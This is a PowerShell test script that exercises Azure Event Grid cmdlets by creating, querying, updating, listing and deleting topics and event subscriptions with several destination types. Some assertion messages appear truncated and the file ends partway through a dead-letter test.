














function EventSubscriptionTests_CustomTopic {
    
    $subscriptionId = Get-SubscriptionId
    $location = Get-LocationForEventGrid
    $topicName = Get-TopicName
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $eventSubscriptionName3 = Get-EventSubscriptionName
    $eventSubscriptionName4 = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
    $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

    New-ResourceGroup $resourceGroupName $location
    $sbNamespaceName = Get-ServiceBusNameSpaceName
    $sbName = Get-ServiceBusName

    New-ServiceBusQueue $ResourceGroupName $sbNamespaceName $sbName $Location
    $eventSubscriptionServiceBusQueueResourceId = Get-ServiceBusQueueResourceId $ResourceGroupName $sbNamespaceName $sbName

    try
    {
        Write-Debug "Creating a new EventGrid Topic: $topicName in resource group $resourceGroupName"
        Write-Debug "Topic: $topicName"
        $result = New-AzEventGridTopic -ResourceGroup $resourceGroupName -Name $topicName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        
        $AdvFilter1=@{operator="NumberIn"; key="Data.Key1"; Values=@(1,2)}
        $AdvFilter2=@{operator="StringBeginsWith"; key="Subject"; Values=@("string1","string2")}
        $AdvFilter3=@{operator="NumberLessThan"; key="Data.Key12"; Value=5.12}
        $AdvFilter4=@{operator="BoolEquals"; key="Data.Key6"; Value=$false}
        $AdvFilter5=@{operator="StringBeginsWith"; key="Subject"; Values=@("string3","string4")}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to topic $topicName in resource group $resourceGroupName"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to topic $topicName in resource group $resourceGroupName"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2 -AdvancedFilter @($AdvFilter1, $AdvFilter2, $AdvFilter3, $AdvFilter4)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        try
        {
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to topic $topicName in resource group $resourceGroupName"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName3 -EventTtl 21300
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as EventTtl range is invalid"
        }
        catch
        {
            Assert-True {$true}
        }

        try
        {
            Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to topic $topicName in resource group $resourceGroupName"
            $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName3 -MaxDeliveryAttempt 300
            Assert-True {$false} "New-AzEventGridSubscription succeeded while it is expected to fail as MaxDeliveryAttempt range is invalid"
        }
        catch
        {
            Assert-True {$true}
        }

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to topic $topicName in resource group $resourceGroupName"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName3 -EventTtl 50 -MaxDeliveryAttempt 20
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName3"
        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName3 -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName3}
        Assert-True {$result.EventTtl -eq 50}
        Assert-True {$result.MaxDeliveryAttempt -eq 20}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to topic $topicName in resource group $resourceGroupName using resourceId and servicebusqueue as destination"
        $includedEventTypes = "All"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/microsoft.eventgrid/topics/$topicName" -Endpoint $eventSubscriptionServiceBusQueueResourceId -EndpointType "servicebusqueue" -EventSubscriptionName $eventSubscriptionName4 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridTopic -ResourceGroup $resourceGroupName -TopicName $topicName | Get-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Updating eventSubscription $eventSubscriptionName to topic $topicName in resource group $resourceGroupName"
        $result = Update-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}
        $webHookDestination = $result.Destination -as [Microsoft.Azure.Management.EventGrid.Models.WebHookEventSubscriptionDestination]
        Assert-AreEqual $webHookDestination.EndpointBaseUrl $eventSubscriptionBaseEndpoint

        Write-Debug "Updating eventSubscription $eventSubscriptionName2 to topic $topicName in resource group $resourceGroupName"
        $result = Update-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2 -EventTtl 10 -MaxDeliveryAttempt 20 -AdvancedFilter @($AdvFilter5)
        Assert-True {$result.ProvisioningState -eq "Succeeded"}
        $webHookDestination = $result.Destination -as [Microsoft.Azure.Management.EventGrid.Models.WebHookEventSubscriptionDestination]
        Assert-AreEqual $webHookDestination.EndpointBaseUrl $eventSubscriptionBaseEndpoint
        Assert-True {$result.EventTtl -eq 10}
        Assert-True {$result.MaxDeliveryAttempt -eq 20}
        Assert-True {$result.Filter.AdvancedFilters -ne $null}

        Write-Debug "Listing all the event subscriptions created for $topicName in the resourceGroup $resourceGroup"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -IncludeFullEndpointUrl
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "

        Write-Debug "Listing all the event subscriptions created for $topicName in the resourceGroup $resourceGroup using input object"
        $allCreatedSubscriptions = Get-AzEventGridTopic -ResourceGroup $resourceGroupName -TopicName $topicName | Get-AzEventGridSubscription
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 4 } "Listing all event subscriptions using Input Object: Event Subscriptions created earlier are not found in the list"

        Write-Debug "Listing first 3 event subscriptions created for $topicName in the resourceGroup $resourceGroup using input object and Top = 3"
        $allCreatedSubscriptions = Get-AzEventGridTopic -ResourceGroup $resourceGroupName -TopicName $topicName | Get-AzEventGridSubscription -Top 3
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -le 3 } "Returned topics count is more than top"
        Assert-True {$allCreatedSubscriptions.NextLink -ne $null } "More event subscriptions are expected under topic $topicName"

        Write-Debug "Listing remaining event subscriptions created for $topicName in the resourceGroup $resourceGroup using NextLink"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -NextLink $allCreatedSubscriptions.NextLink
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -le 1 } "More expected topics"
        

        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Get-AzEventGridTopic -ResourceGroup $resourceGroupName -TopicName $topicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName2

        Write-Debug "Deleting event subscription: $eventSubscriptionName3"
        Get-AzEventGridTopic -ResourceGroup $resourceGroupName -TopicName $topicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName3

        Write-Debug "Deleting event subscription: $eventSubscriptionName4"
        Remove-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName4

        
        $returnedES = Get-AzEventGridSubscription -ResourceGroup $resourceGroupName -TopicName $topicName
        Assert-True {$returnedES.PsEventSubscriptionsList.Count -eq 0}
    }
    finally
    {
        Remove-ServiceBusResources $ResourceGroupName $sbNamespaceName $sbName
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_CustomTopic2 {
    
    $location = Get-LocationForEventGrid
    $topicName = Get-TopicName
    $eventSubscriptionName = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
    $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

    New-ResourceGroup $resourceGroupName $location

    try
    {
        Write-Host "Creating a new EventGrid Topic: $topicName in resource group $resourceGroupName"
        $result = New-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName -Location $location
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to topic $topicName in resource group $resourceGroupName"
        $result = Get-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName | New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName -TopicName $topicName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Updating eventSubscription $eventSubscriptionName to topic $topicName in resource group $resourceGroupName"
        $updateResult = $result | Update-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -SubjectEndsWith "NewSuffix"
        Assert-True {$updateResult.ProvisioningState -eq "Succeeded"}
        $webHookDestination = $updateResult.Destination -as [Microsoft.Azure.Management.EventGrid.Models.WebHookEventSubscriptionDestination]
        Assert-AreEqual $webHookDestination.EndpointBaseUrl $eventSubscriptionBaseEndpoint
        Assert-True {$updateResult.Filter.SubjectEndsWith -eq "NewSuffix"}

        Write-Debug "Deleting event subscription $eventSubscriptionName"
        Get-AzEventGridTopic -ResourceGroupName $resourceGroupName -Name $topicName | Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting topic $topicName"
        Remove-AzEventGridTopic -Name $topicName -ResourceGroupName $resourceGroupName
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_ResourceGroup {
    
    $subscriptionId = Get-SubscriptionId
    $location = Get-LocationForEventGrid
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint

    New-ResourceGroup $resourceGroupName  $location

    try
    {
        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to resource group $resourceGroupName"
        $labels = "Finance", "HR"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -Label $labels
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to resource group $resourceGroupName"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Updating eventSubscription $eventSubscriptionName to resource group $resourceGroupName"
        $newLabels = "Marketing", "Sales"
        $updateResult = Update-AzEventGridSubscription -ResourceGroup $resourceGroupName -EventSubscriptionName $eventSubscriptionName -SubjectEndsWith "NewSuffix" -Label $newLabels
        Assert-True {$updateResult.ProvisioningState -eq "Succeeded"}
        Assert-True {$updateResult.Filter.SubjectEndsWith -eq "NewSuffix"}
        $updatedLabels = $updateResult.Labels
        Assert-AreEqual 2 $updatedLabels.Count;
        Assert-AreEqual "Marketing" $updatedLabels[0];
        Assert-AreEqual "Sales" $updatedLabels[1];

        
        
        
        

        
        
        
        

        
        
        

        
        
        

        
        
        
        

        
        
        

        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName" -EventSubscriptionName $eventSubscriptionName2

        
        $returnedES = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName"
        Assert-True {$returnedES.PsEventSubscriptionsList.Count -eq 0}
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_Subscription {
    
    $subscriptionId = Get-SubscriptionId
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $eventSubscriptionName3 = Get-EventSubscriptionName
    $eventSubscriptionName4 = Get-EventSubscriptionName

    $location = Get-LocationForEventGrid
    $resourceGroupName = Get-ResourceGroupName

    New-ResourceGroup $resourceGroupName $location

    $storageAccountName = Get-StorageAccountName
    $storageQueueName = Get-StorageQueueName

    New-StorageQueue $ResourceGroupName $storageAccountName $storageQueueName $Location
    $eventSubscriptionStorageDestinationResourceId = Get-StorageDestinationResourceId $ResourceGroupName $storageAccountName $storageQueueName

    $hcNamespaceName = Get-HybridConnNameSpaceName
    $hcName = Get-HybridConnName

    New-HybridConnection $ResourceGroupName $hcNamespaceName $hcName $Location
    $eventSubscriptionHybridConnectionResourceId = Get-HybridConnectionResourceId $ResourceGroupName $hcNamespaceName $hcName

    $sbNamespaceName = Get-ServiceBusNameSpaceName
    $sbName = Get-ServiceBusName

    New-ServiceBusQueue $ResourceGroupName $sbNamespaceName $sbName $Location
    $eventSubscriptionServiceBusQueueResourceId = Get-ServiceBusQueueResourceId $ResourceGroupName $sbNamespaceName $sbName

    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
    $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

    try
    {
        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to subscription $subscriptionId using webhook as a destination"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to subscription $subscriptionId using storage queue as a destination"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -Endpoint $eventSubscriptionStorageDestinationResourceId -EndpointType "SToRageQUEue" -EventSubscriptionName $eventSubscriptionName2 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName3 to subscription $subscriptionId using hybrid connections as a destination"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -Endpoint $eventSubscriptionHybridConnectionResourceId -EndpointType "hYbridConNECtIon" -EventSubscriptionName $eventSubscriptionName3 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName4 to subscription $subscriptionId using Service Bus Queue as a destination"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -Endpoint $eventSubscriptionServiceBusQueueResourceId -EndpointType "servicebusqueue" -EventSubscriptionName $eventSubscriptionName4 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Updating eventSubscription $eventSubscriptionName to Azure subscription $subscriptionId"
        $updateResult = Update-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName -SubjectEndsWith "NewSuffix" -Endpoint $eventSubscriptionEndpoint
        Assert-True {$updateResult.ProvisioningState -eq "Succeeded"}
        Assert-True {$updateResult.Filter.SubjectEndsWith -eq "NewSuffix"}
        $webHookDestination = $updateResult.Destination -as [Microsoft.Azure.Management.EventGrid.Models.WebHookEventSubscriptionDestination]
        Assert-AreEqual $webHookDestination.EndpointBaseUrl $eventSubscriptionBaseEndpoint

        Write-Debug "Listing all the event subscriptions created for subscription $subscriptionId"
        $allCreatedEventSubscriptions = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId"
        Assert-True {$allCreatedEventSubscriptions.PsEventSubscriptionsList.Count -ge 3 } "

        Write-Debug "Listing all the event subscriptions created for subscription $subscriptionId"
        $allCreatedEventSubscriptions = Get-AzEventGridSubscription
        Assert-True {$allCreatedEventSubscriptions.PsEventSubscriptionsList.Count -ge 3 } "
    }
    finally
    {
        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName2

        Write-Debug "Deleting event subscription: $eventSubscriptionName3"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName3

        Write-Debug "Deleting event subscription: $eventSubscriptionName4"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId" -EventSubscriptionName $eventSubscriptionName4

        Remove-HybridConnectionResources $ResourceGroupName $hcNamespaceName $hcName

        Remove-ServiceBusResources $ResourceGroupName $sbNamespaceName $sbName
        Remove-StorageResources $ResourceGroupName $storageAccountName $storageQueueName
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_Resource {
    
    $subscriptionId = Get-SubscriptionId
    $location = Get-LocationForEventGrid
    $namespaceName = Get-EventHubNamespaceName
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
    $eventSubscriptionBaseEndpoint = Get-EventSubscriptionWebhookBaseEndpoint

    New-ResourceGroup $resourceGroupName $location

    try
    {
        Write-Debug "Creating a new EventHub namespace"
        New-AzureRmEventHubNamespace -ResourceGroupName $resourceGroupName -NamespaceName $namespaceName -Location $location

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to EH namespace $namespaceName"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to EH namespace $namespaceName"
        $result = New-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -EventSubscriptionName $eventSubscriptionName
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Updating eventSubscription $eventSubscriptionName to Azure resource $subscriptionId"
        $updateResult = Update-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -EventSubscriptionName $eventSubscriptionName -SubjectEndsWith "NewSuffix" -Endpoint $eventSubscriptionEndpoint
        Assert-True {$updateResult.ProvisioningState -eq "Succeeded"}
        Assert-True {$updateResult.Filter.SubjectEndsWith -eq "NewSuffix"}
        $webHookDestination = $updateResult.Destination -as [Microsoft.Azure.Management.EventGrid.Models.WebHookEventSubscriptionDestination]
        Assert-AreEqual $webHookDestination.EndpointBaseUrl $eventSubscriptionBaseEndpoint

        Write-Debug "Getting the created event subscription $eventSubscriptionName with full endpoint URL"
        $result = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Listing all the event subscriptions created for EH namespace $namespaceName"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName"
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 2 } "

        Write-Debug "Listing all the GLOBAL event subscriptions in the subscription for all EventHub namespaces, there should be none"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -TopicTypeName "Microsoft.EventHub.Namespaces"
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 0 } "

        Write-Debug "Listing all the event subscriptions in the subscription for all EventHub namespaces in a particular location"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -TopicTypeName "Microsoft.EventHub.Namespaces" -Location $location
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -ge 1 } "

        Write-Debug "Listing all the event subscriptions in the subscription in a particular location"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -Location $location
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -ge 1 } "

        Write-Debug "Listing all the event subscriptions in the Resource Group for all EventHub namespaces"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -TopicTypeName "Microsoft.EventHub.Namespaces" -ResourceGroupName $resourceGroupName
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 0 } "

        Write-Debug "Listing all the event subscriptions in the Resource Group for all EventHub namespaces in a particular location"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -TopicTypeName "Microsoft.EventHub.Namespaces" -Location $location -ResourceGroupName $resourceGroupName
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -ge 1 } "

        Write-Debug "Listing all the event subscriptions in the Resource Group in a particular location"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -Location $location -ResourceGroupName $resourceGroupName
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -ge 1 } "

        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Remove-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName" -EventSubscriptionName $eventSubscriptionName2

        
        $returnedES = Get-AzEventGridSubscription -ResourceId "/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.EventHub/namespaces/$namespaceName"
        Assert-True {$returnedES.PsEventSubscriptionsList.Count -eq 0}
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_ResourceGroup2 {
    
    $location = Get-LocationForEventGrid
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint

    New-ResourceGroup $resourceGroupName $location

    try
    {
        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to resource group $resourceGroupName"
        $labels = "Finance", "HR"
        $result = New-AzEventGridSubscription -ResourceGroupName $resourceGroupName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -Label $labels
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to resource group $resourceGroupName"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -ResourceGroup $resourceGroupName -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Listing all the event subscriptions created for resourceGroup $resourceGroup"
        $allCreatedSubscriptions = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -eq 2 } "

        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -ResourceGroupName $resourceGroupName -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Remove-AzEventGridSubscription -ResourceGroupName $resourceGroupName -EventSubscriptionName $eventSubscriptionName2

        
        $returnedES = Get-AzEventGridSubscription -ResourceGroupName $resourceGroupName
        Assert-True {$returnedES.PsEventSubscriptionsList.Count -eq 0}
    }
    finally
    {
        Remove-ResourceGroup $resourceGroupName
    }
}


function EventSubscriptionTests_Subscription2 {
    
    $eventSubscriptionName = Get-EventSubscriptionName
    $eventSubscriptionName2 = Get-EventSubscriptionName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint

    try
    {
        Write-Debug "Creating a new EventSubscription $eventSubscriptionName to Azure subscription"
        $labels = "Finance", "HR"
        $result = New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName -Label $labels
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Creating a new EventSubscription $eventSubscriptionName2 to Azure subscription"
        $includedEventTypes = "Microsoft.Resources.ResourceWriteFailure", "Microsoft.Resources.ResourceWriteSuccess"
        $result = New-AzEventGridSubscription -Endpoint $eventSubscriptionEndpoint -EventSubscriptionName $eventSubscriptionName2 -IncludedEventType $includedEventTypes
        Assert-True {$result.ProvisioningState -eq "Succeeded"}

        Write-Debug "Getting the created event subscription $eventSubscriptionName"
        $result = Get-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName -IncludeFullEndpointUrl
        Assert-True {$result.EventSubscriptionName -eq $eventSubscriptionName}

        Write-Debug "Listing all the event subscriptions created for Azure subscription"
        $allCreatedSubscriptions = Get-AzEventGridSubscription
        Assert-True {$allCreatedSubscriptions.PsEventSubscriptionsList.Count -ge 2 } "
    }
    finally
    {
        Write-Debug "Deleting event subscription: $eventSubscriptionName"
        Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName

        Write-Debug "Deleting event subscription: $eventSubscriptionName2"
        Remove-AzEventGridSubscription -EventSubscriptionName $eventSubscriptionName2
    }
}


function EventSubscriptionTests_Deadletter {
    
    $location = Get-LocationForEventGrid
    $topicName = Get-TopicName
    $domainName = Get-DomainName
    $domainTopicName = Get-DomainTopicName
    $subscriptionId = Get-SubscriptionId
    $eventSubscriptionName = Get-EventSubscriptionName
    $resourceGroupName = Get-ResourceGroupName
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint
    $eventSubscriptionEndpoint = Get-EventSubscriptionWebhookEndpoint

    New-ResourceGroup $resourceGroupName $location

    $storageAccountName = Get-StorageAccountName
